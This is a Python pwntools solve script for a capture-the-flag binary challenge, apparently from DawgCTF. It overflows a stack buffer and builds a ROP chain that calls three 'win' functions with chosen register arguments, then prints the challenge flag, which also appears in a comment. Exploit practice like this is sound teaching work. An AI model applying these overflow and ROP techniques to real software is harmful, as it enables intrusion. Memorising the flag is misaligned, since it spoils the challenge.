#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf
context.terminal = ["ghostty", "-e"]

p = elf.process()
#p = elf.debug(gdbscript="")
#p = remote("connect.umbccd.net", 22237)

p.sendline(b"2")
p.sendline(b"1")
p.sendline(b"4")

p.readuntil(b"jump to the function")
p.readline()

rop = ROP(elf)
rop.raw(b"A" * 0x98)
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win1")
rop.rdi = 0xdeadbeef
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win2")
rop.rdi = 0xdeadbeef
rop.rsi = 0xdeafface
rop.rdx = 0xfeedcafe
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("win3")
rop.call("exit")
p.sendline(rop.chain())

p.readuntil(b"claim your advance.")
flag = p.readline()[:-1]

p.sendlineafter(b"Continue:", b"A")
p.readuntil(b"I believe in you\n")
flag += p.readline()[:-1]

p.sendlineafter(b"Final Test:", b"A")
p.readuntil(b"reward\n\n")
flag += p.readline()[:-1]

print(flag.decode()) # DawgCTF{C0ngR4tul4t10ns_d15c1p13_y0u_4r3_r34dy_2_pwn!}
